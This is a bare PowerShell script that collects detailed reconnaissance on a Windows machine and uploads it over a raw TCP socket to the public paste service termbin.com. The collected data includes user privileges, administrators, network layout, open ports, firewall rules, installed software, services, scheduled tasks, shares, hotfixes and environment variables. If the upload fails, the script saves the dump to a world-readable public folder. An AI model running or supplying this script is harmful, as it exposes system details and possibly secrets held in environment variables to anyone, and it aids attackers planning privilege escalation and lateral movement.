$out = @()
$out += "=== HOSTNAME ==="; $out += hostname
$out += "=== OS INFO ==="; $out += (Get-ComputerInfo | Select-Object OsName, OsVersion, OsBuildNumber, CsName | Out-String)
$out += "=== CURRENT USER ==="; $out += (whoami /all)
$out += "=== LOCAL USERS ==="; $out += (Get-LocalUser | Out-String)
$out += "=== LOCAL GROUPS ==="; $out += (Get-LocalGroup | Out-String)
$out += "=== ADMINISTRATORS ==="; $out += (Get-LocalGroupMember -Group "Administrators" | Out-String)
$out += "=== NETWORK INTERFACES ==="; $out += (Get-NetIPAddress | Out-String)
$out += "=== ROUTING TABLE ==="; $out += (Get-NetRoute | Out-String)
$out += "=== OPEN PORTS ==="; $out += (Get-NetTCPConnection | Where-Object State -eq 'Listen' | Out-String)
$out += "=== ARP TABLE ==="; $out += (Get-NetNeighbor | Out-String)
$out += "=== DNS SERVERS ==="; $out += (Get-DnsClientServerAddress | Out-String)
$out += "=== HOSTS FILE ==="; $out += (Get-Content C:\Windows\System32\drivers\etc\hosts)
$out += "=== FIREWALL PROFILES ==="; $out += (Get-NetFirewallProfile | Out-String)
$out += "=== FIREWALL RULES ==="; $out += (Get-NetFirewallRule | Where-Object Enabled -eq 'True' | Select-Object DisplayName, Direction, Action | Out-String)
$out += "=== INSTALLED SOFTWARE ==="; $out += (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher | Out-String)
$out += "=== INSTALLED SOFTWARE (32bit) ==="; $out += (Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher | Out-String)
$out += "=== RUNNING SERVICES ==="; $out += (Get-Service | Where-Object Status -eq 'Running' | Out-String)
$out += "=== PROCESSES ==="; $out += (Get-Process | Out-String)
$out += "=== SCHEDULED TASKS ==="; $out += (Get-ScheduledTask | Where-Object State -ne 'Disabled' | Out-String)
$out += "=== STARTUP ITEMS ==="; $out += (Get-CimInstance Win32_StartupCommand | Out-String)
$out += "=== SHARES ==="; $out += (Get-SmbShare | Out-String)
$out += "=== HOTFIXES ==="; $out += (Get-HotFix | Out-String)
$out += "=== ENVIRONMENT VARIABLES ==="; $out += (Get-ChildItem Env: | Out-String)
$out += "=== DRIVES ==="; $out += (Get-PSDrive | Out-String)

# Join everything into one string
$body = $out -join "`n"

# Upload to termbin
try {
    $tcp = New-Object System.Net.Sockets.TcpClient("termbin.com", 9999)
    $stream = $tcp.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)
    $writer.Write($body)
    $writer.Flush()
    $tcp.Client.Shutdown("Send")
    $url = $reader.ReadToEnd().Trim()
    $tcp.Close()
    Write-Host "Output uploaded to: $url"
} catch {
    # Fallback: save locally if upload fails
    $body | Out-File -FilePath C:\Users\Public\inventory.txt -Encoding UTF8
    Write-Host "Upload failed. Saved locally to C:\Users\Public\inventory.txt"
}